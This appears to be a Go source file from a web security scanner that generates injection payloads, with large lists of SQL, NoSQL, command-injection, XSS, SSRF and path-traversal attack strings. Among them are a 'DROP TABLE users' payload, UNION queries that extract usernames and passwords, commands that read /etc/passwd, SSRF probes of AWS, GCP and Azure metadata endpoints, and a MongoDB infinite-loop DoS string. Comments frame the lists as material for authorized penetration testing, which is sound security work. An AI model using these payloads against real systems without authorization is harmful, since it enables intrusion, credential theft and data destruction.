package payloads

import (
	"strings"

	"github.com/su1ph3r/indago/pkg/types"
)

// InjectionGenerator generates injection attack payloads
type InjectionGenerator struct {
	config      types.InjectionSettings
	attackType  string
	payloadList []struct {
		value string
		desc  string
	}
}

// NewInjectionGenerator creates a new injection payload generator
func NewInjectionGenerator(config types.InjectionSettings) *InjectionGenerator {
	return &InjectionGenerator{config: config}
}

// ForSQLi configures for SQL injection
func (g *InjectionGenerator) ForSQLi() *InjectionGenerator {
	g.attackType = types.AttackSQLi
	g.payloadList = sqlInjectionPayloads
	return g
}

// ForNoSQLi configures for NoSQL injection
func (g *InjectionGenerator) ForNoSQLi() *InjectionGenerator {
	g.attackType = types.AttackNoSQLi
	g.payloadList = noSQLInjectionPayloads
	return g
}

// ForCommand configures for command injection
func (g *InjectionGenerator) ForCommand() *InjectionGenerator {
	g.attackType = types.AttackCommandInject
	g.payloadList = commandInjectionPayloads
	return g
}

// Type returns the attack type
func (g *InjectionGenerator) Type() string {
	return g.attackType
}

// Generate generates injection payloads for a parameter
func (g *InjectionGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Only target string parameters
	if param.Type != "string" && param.Type != "" {
		return payloads
	}

	for _, p := range g.payloadList {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        g.attackType,
			Category:    "injection",
			Description: p.desc,
		})
	}

	return payloads
}

// SQL injection payloads - these are security testing payloads for authorized pentesting
var sqlInjectionPayloads = []struct {
	value string
	desc  string
}{
	// Basic detection
	{"'", "Single quote (error-based detection)"},
	{"\"", "Double quote (error-based detection)"},
	{"' OR '1'='1", "Classic OR true"},
	{"' OR '1'='1'--", "OR true with comment"},
	{"' OR '1'='1'/*", "OR true with block comment"},
	{"\" OR \"1\"=\"1", "Double quote OR true"},
	{"1' OR '1'='1", "Numeric OR true"},
	{"1 OR 1=1", "Numeric without quotes"},
	{"' OR 1=1--", "Simple OR 1=1"},
	{"') OR ('1'='1", "Parenthesis bypass"},
	{"'; DROP TABLE users;--", "Destructive (detection)"},

	// Union-based
	{"' UNION SELECT NULL--", "UNION NULL"},
	{"' UNION SELECT NULL,NULL--", "UNION two columns"},
	{"' UNION SELECT NULL,NULL,NULL--", "UNION three columns"},
	{"1 UNION SELECT 1,2,3--", "Numeric UNION"},
	{"' UNION SELECT username,password FROM users--", "UNION data extraction"},

	// Blind SQLi
	{"' AND '1'='1", "Blind boolean true"},
	{"' AND '1'='2", "Blind boolean false"},
	{"' AND SLEEP(5)--", "Time-based blind (MySQL)"},
	{"'; WAITFOR DELAY '0:0:5'--", "Time-based blind (MSSQL)"},
	{"' AND pg_sleep(5)--", "Time-based blind (PostgreSQL)"},
	{"1 AND 1=1", "Numeric blind true"},
	{"1 AND 1=2", "Numeric blind false"},

	// Bypass techniques
	{"'/**/OR/**/1=1--", "Comment bypass"},
	{"' oR '1'='1", "Case variation"},
	{"'%20OR%201=1--", "URL encoded spaces"},
	{"' OR 'x'='x", "String comparison"},
	{"%27%20OR%20%271%27=%271", "Full URL encoding"},
	{"&#x27; OR &#x27;1&#x27;=&#x27;1", "HTML entity encoding"},

	// Error-based extraction
	{"' AND extractvalue(1,concat(0x7e,version()))--", "ExtractValue (MySQL)"},
	{"' AND 1=CONVERT(int,@@version)--", "Error-based (MSSQL)"},
}

// NoSQL injection payloads - these are security testing payloads for authorized pentesting
var noSQLInjectionPayloads = []struct {
	value string
	desc  string
}{
	// MongoDB
	{`{"$gt":""}`, "MongoDB $gt operator"},
	{`{"$ne":""}`, "MongoDB $ne not equal"},
	{`{"$regex":".*"}`, "MongoDB regex wildcard"},
	{`{"$where":"1==1"}`, "MongoDB $where true"},
	{`{"$or":[{},{"a":"a"}]}`, "MongoDB $or bypass"},
	{`{"$and":[{"x":"x"},{"x":{"$gt":""}}]}`, "MongoDB $and with $gt"},
	{`[$ne]=1`, "URL-style $ne"},
	{`[$gt]=`, "URL-style $gt empty"},
	{`[$regex]=.*`, "URL-style $regex"},

	// JavaScript injection (MongoDB)
	{`'; return this.password; '`, "JS injection (return)"},
	{`'; while(1){}; '`, "JS injection (DoS)"},
	{`true, $or: [ {}, { a: 'a' } ]`, "Operator injection"},

	// Generic NoSQL
	{`{"username":{"$gt":""},"password":{"$gt":""}}`, "Full auth bypass"},
	{`||'1'=='1`, "Boolean OR bypass"},
}

// Command injection payloads - these are security testing payloads for authorized pentesting
var commandInjectionPayloads = []struct {
	value string
	desc  string
}{
	// Basic separators
	{"; id", "Semicolon separator"},
	{"| id", "Pipe operator"},
	{"|| id", "OR operator"},
	{"& id", "Background operator"},
	{"&& id", "AND operator"},
	{"\n id", "Newline separator"},
	{"`id`", "Backtick execution"},
	{"$(id)", "Command substitution"},

	// With common commands
	{"; whoami", "Semicolon whoami"},
	{"| whoami", "Pipe whoami"},
	{"; cat /etc/passwd", "Read passwd"},
	{"| cat /etc/passwd", "Pipe read passwd"},
	{"; sleep 5", "Time-based (sleep)"},
	{"| sleep 5", "Time-based (pipe sleep)"},
	{"; ping -c 5 127.0.0.1", "ICMP test"},

	// Bypass techniques
	{";{id,}", "Brace expansion"},
	{";\nid", "Newline bypass"},
	{";$IFS$9id", "IFS bypass"},
	{";${IFS}id", "IFS variable"},
	{"';id;'", "Quote escape"},
	{"\";id;\"", "Double quote escape"},

	// Windows
	{"& whoami", "Windows whoami"},
	{"| type C:\\Windows\\win.ini", "Windows file read"},
	{"& ping -n 5 127.0.0.1", "Windows ping"},
	{"& dir", "Windows dir"},

	// Encoded
	{"%3B%20id", "URL encoded semicolon"},
	{"%7C%20id", "URL encoded pipe"},
	{"%0Aid", "URL encoded newline"},
}

// XSSGenerator generates XSS attack payloads
type XSSGenerator struct{}

// NewXSSGenerator creates a new XSS payload generator
func NewXSSGenerator() *XSSGenerator {
	return &XSSGenerator{}
}

// Type returns the attack type
func (g *XSSGenerator) Type() string {
	return types.AttackXSS
}

// Generate generates XSS payloads for a parameter
func (g *XSSGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Only target string parameters
	if param.Type != "string" && param.Type != "" {
		return payloads
	}

	for _, p := range xssPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        types.AttackXSS,
			Category:    "injection",
			Description: p.desc,
		})
	}

	return payloads
}

// XSS payloads - these are security testing payloads for authorized pentesting
var xssPayloads = []struct {
	value string
	desc  string
}{
	// Basic
	{`<script>alert(1)</script>`, "Basic script tag"},
	{`<img src=x onerror=alert(1)>`, "IMG onerror"},
	{`<svg onload=alert(1)>`, "SVG onload"},
	{`<body onload=alert(1)>`, "Body onload"},
	{`javascript:alert(1)`, "JavaScript protocol"},
	{`<a href="javascript:alert(1)">click</a>`, "Anchor JS"},

	// Event handlers
	{`" onmouseover="alert(1)`, "Onmouseover"},
	{`' onfocus='alert(1)' autofocus='`, "Onfocus autofocus"},
	{`<input onfocus=alert(1) autofocus>`, "Input autofocus"},
	{`<marquee onstart=alert(1)>`, "Marquee onstart"},
	{`<video><source onerror="alert(1)">`, "Video source error"},

	// Bypass techniques
	{`<ScRiPt>alert(1)</ScRiPt>`, "Case variation"},
	{`<script>alert(String.fromCharCode(88,83,83))</script>`, "CharCode"},
	{`<img src=x onerror=alert&#40;1&#41;>`, "HTML entities"},
	{`<img src=x onerror=\u0061lert(1)>`, "Unicode escape"},

	// Template injection
	{`{{constructor.constructor('return 1')()}}`, "Angular template"},
	{`${7*7}`, "Template literal"},
	{`#{7*7}`, "Ruby ERB style"},
}

// SSRFGenerator generates SSRF attack payloads
type SSRFGenerator struct{}

// NewSSRFGenerator creates a new SSRF payload generator
func NewSSRFGenerator() *SSRFGenerator {
	return &SSRFGenerator{}
}

// Type returns the attack type
func (g *SSRFGenerator) Type() string {
	return types.AttackSSRF
}

// Generate generates SSRF payloads for a parameter
func (g *SSRFGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Only target URL-like parameters
	nameLower := strings.ToLower(param.Name)
	if !strings.Contains(nameLower, "url") &&
		!strings.Contains(nameLower, "uri") &&
		!strings.Contains(nameLower, "path") &&
		!strings.Contains(nameLower, "dest") &&
		!strings.Contains(nameLower, "redirect") &&
		!strings.Contains(nameLower, "link") &&
		!strings.Contains(nameLower, "src") &&
		!strings.Contains(nameLower, "source") {
		return payloads
	}

	for _, p := range ssrfPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        types.AttackSSRF,
			Category:    "ssrf",
			Description: p.desc,
		})
	}

	return payloads
}

// SSRF payloads - these are security testing payloads for authorized pentesting
var ssrfPayloads = []struct {
	value string
	desc  string
}{
	// Localhost
	{"http://127.0.0.1", "Localhost IPv4"},
	{"http://localhost", "Localhost hostname"},
	{"http://[::1]", "Localhost IPv6"},
	{"http://0.0.0.0", "All interfaces"},
	{"http://127.1", "Short localhost"},
	{"http://127.0.1", "Short localhost 2"},

	// Internal networks
	{"http://192.168.0.1", "Private 192.168.x.x"},
	{"http://10.0.0.1", "Private 10.x.x.x"},
	{"http://172.16.0.1", "Private 172.16.x.x"},
	{"http://169.254.169.254", "AWS metadata"},
	{"http://metadata.google.internal", "GCP metadata"},

	// Cloud metadata endpoints
	{"http://169.254.169.254/latest/meta-data/", "AWS metadata path"},
	{"http://169.254.169.254/latest/user-data/", "AWS user data"},
	{"http://169.254.169.254/computeMetadata/v1/", "GCP metadata"},
	{"http://169.254.169.254/metadata/instance", "Azure metadata"},

	// Bypass techniques
	{"http://2130706433", "Decimal IP localhost"},
	{"http://0x7f000001", "Hex IP localhost"},
	{"http://017700000001", "Octal IP localhost"},
	{"http://127.0.0.1.nip.io", "DNS rebinding"},
	{"http://127.0.0.1.xip.io", "DNS rebinding 2"},
	{"http://localtest.me", "localhost alias"},

	// Protocol variations
	{"file:///etc/passwd", "File protocol"},
	{"gopher://127.0.0.1:6379/_INFO", "Gopher Redis"},
	{"dict://127.0.0.1:6379/INFO", "Dict protocol"},
}

// PathTraversalGenerator generates path traversal payloads
type PathTraversalGenerator struct{}

// NewPathTraversalGenerator creates a new path traversal generator
func NewPathTraversalGenerator() *PathTraversalGenerator {
	return &PathTraversalGenerator{}
}

// Type returns the attack type
func (g *PathTraversalGenerator) Type() string {
	return types.AttackPathTraversal
}

// Generate generates path traversal payloads
func (g *PathTraversalGenerator) Generate(endpoint types.Endpoint, param *types.Parameter) []Payload {
	var payloads []Payload

	// Target file/path-like parameters
	nameLower := strings.ToLower(param.Name)
	if !strings.Contains(nameLower, "file") &&
		!strings.Contains(nameLower, "path") &&
		!strings.Contains(nameLower, "name") &&
		!strings.Contains(nameLower, "doc") &&
		!strings.Contains(nameLower, "template") &&
		!strings.Contains(nameLower, "page") {
		return payloads
	}

	for _, p := range pathTraversalPayloads {
		payloads = append(payloads, Payload{
			Value:       p.value,
			Type:        types.AttackPathTraversal,
			Category:    "injection",
			Description: p.desc,
		})
	}

	return payloads
}

// Path traversal payloads - these are security testing payloads for authorized pentesting
var pathTraversalPayloads = []struct {
	value string
	desc  string
}{
	// Basic Unix
	{"../../../etc/passwd", "Unix passwd (3 levels)"},
	{"../../../../etc/passwd", "Unix passwd (4 levels)"},
	{"../../../../../etc/passwd", "Unix passwd (5 levels)"},
	{"../../../../../../etc/passwd", "Unix passwd (6 levels)"},
	{"/etc/passwd", "Absolute path"},
	{"....//....//....//etc/passwd", "Double dot bypass"},

	// Encoded
	{"%2e%2e/%2e%2e/%2e%2e/etc/passwd", "URL encoded dots"},
	{"%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Full URL encoding"},
	{"..%252f..%252f..%252fetc/passwd", "Double URL encoding"},
	{"%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd", "UTF-8 overlong"},

	// Null byte
	{"../../../etc/passwd%00", "Null byte suffix"},
	{"../../../etc/passwd%00.png", "Null byte extension"},

	// Windows
	{"..\\..\\..\\windows\\win.ini", "Windows backslash"},
	{"....\\....\\....\\windows\\win.ini", "Windows double dot"},
	{"%5c..%5c..%5c..%5cwindows%5cwin.ini", "Windows URL encoded"},

	// Bypass variations
	{"..././..././etc/passwd", "Nested traversal"},
	{"..;/..;/..;/etc/passwd", "Semicolon bypass"},
	{"..%00/..%00/etc/passwd", "Null in path"},
}
